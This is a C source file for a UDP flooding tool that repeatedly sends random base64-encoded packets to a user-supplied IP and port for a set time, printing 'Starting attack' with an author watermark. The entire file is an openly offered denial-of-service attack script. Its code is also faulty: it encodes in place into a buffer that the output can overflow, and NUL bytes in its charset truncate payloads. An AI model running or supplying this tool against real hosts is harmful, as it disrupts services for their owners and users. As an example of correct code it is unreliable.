#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_PAYLOAD_SIZE 2048  // Increased payload size

// Base64 encoding table
const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Function to generate random payload with mixed characters
void generate_random_payload(char *payload, int size) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09";
    for (int i = 0; i < size - 1; i++) {
        payload[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    payload[size - 1] = '\0';
}

// Function to encode the payload in base64
void base64_encode(char *output, const char *input, size_t length) {
    int i, j = 0;
    unsigned char a3[3], a4[4];
    for (i = 0; i < length; i += 3) {
        a3[0] = input[i];
        a3[1] = (i + 1 < length) ? input[i + 1] : 0;
        a3[2] = (i + 2 < length) ? input[i + 2] : 0;

        a4[0] = a3[0] >> 2;
        a4[1] = ((a3[0] & 0x03) << 4) | (a3[1] >> 4);
        a4[2] = ((a3[1] & 0x0F) << 2) | (a3[2] >> 6);
        a4[3] = a3[2] & 0x3F;

        for (j = 0; j < 4; j++) {
            output[(i / 3) * 4 + j] = base64_table[a4[j]];
        }
    }
    output[(i / 3) * 4] = '\0';
}

// Function to simulate random delays between packet sends
void random_sleep() {
    int sleep_time = rand() % 1000000;  // Sleep for up to 1 second
    usleep(sleep_time);
}

// Function to create a socket and configure server address
int setup_socket(const char *ip, int port, struct sockaddr_in *server_addr) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    server_addr->sin_family = AF_INET;
    server_addr->sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr->sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        exit(EXIT_FAILURE);
    }

    return sockfd;
}

// Function to send a single packet
void send_packet(int sockfd, struct sockaddr_in *server_addr, const char *payload) {
    // Send the base64 encoded payload
    if (sendto(sockfd, payload, strlen(payload), 0, (struct sockaddr *)server_addr, sizeof(*server_addr)) == -1) {
        perror("Send failed");
    }
    printf("Packet sent: %s\n", payload);
    random_sleep();  // Introduce random delay between packets
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <ip> <port> <time>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    struct sockaddr_in server_addr;
    int sockfd = setup_socket(ip, port, &server_addr);

    printf("THE WATERMARK BY MOIN Starting attack on %s:%d for %d seconds\n", ip, port, duration);

    time_t start_time = time(NULL);

    while (difftime(time(NULL), start_time) < duration) {
        // Generate and send the payload
        char payload[MAX_PAYLOAD_SIZE];
        generate_random_payload(payload, rand() % (MAX_PAYLOAD_SIZE - 1) + 1);  // Random payload size
        base64_encode(payload, payload, strlen(payload));  // Encode in base64

        // Send the packet
        send_packet(sockfd, &server_addr, payload);
    }

    printf("\nAttack Finished. Packets sent for %d seconds.\n", duration);

    close(sockfd);
    return 0;
}
